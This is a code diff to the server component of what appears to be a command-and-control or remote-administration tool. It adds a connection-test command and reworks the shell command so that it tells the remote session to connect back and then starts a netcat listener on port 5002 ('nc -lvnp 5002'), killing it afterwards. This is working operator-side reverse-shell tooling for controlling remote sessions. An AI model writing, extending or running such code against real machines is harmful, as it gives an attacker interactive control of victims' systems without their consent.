@@ -55,7 +55,13 @@ class server():
                 'method' : self._shell,
                 'use' : 'shell',
                 'desc' : 'Spawns a reverse shell to the current session'
+            },
+            'test-con' : {
+                'method' : self._test_con,
+                'use' : 'test-con',
+                'desc' : 'tests connection to session.'
             }
+
         
         }
 
@@ -104,21 +110,30 @@ class server():
         return
     
     def start_shell(self):
+
+        #send message
+        self.current_session.send_instruction("shell")
+
         #spawn a listener on port 5002
         helpers.show("SPAWNING LISTENER SHELL", colour="BLUE", style="BRIGHT", end="\n")   
-        try:
-            subprocess.call(['gnome-terminal', '--', 'bash', '-c', 'nc -lvnp 5002'])
-        except Exception as e:
-            print(f"Error executing command: {e}")
-        #start a reverse tcp shell
-        self.current_session.send_instruction("shell")
+        # Command to execute
+        os.system('nc -lvnp 5002')
+
+        
         
     
     def _shell(self):
         #spawn a reverse shell
         self.start_shell()
+
+        # Clean up port 5002 after shell exits
+        os.system("pkill -f 'nc -lvnp 5002'")  
         
-        
+    def _test_con(self):
+        if self.current_session.check_connection():
+            helpers.show("SESSION IS CONNECTED", colour='GREEN', style='BRIGHT', end='')
+        else:
+            helpers.show("SESSION IS NOT CONNECTED", colour='RED', style='BRIGHT', end='')
 
     def _sesh(self, ID):
         '''Changes the current session to the session with the specified ID.'''
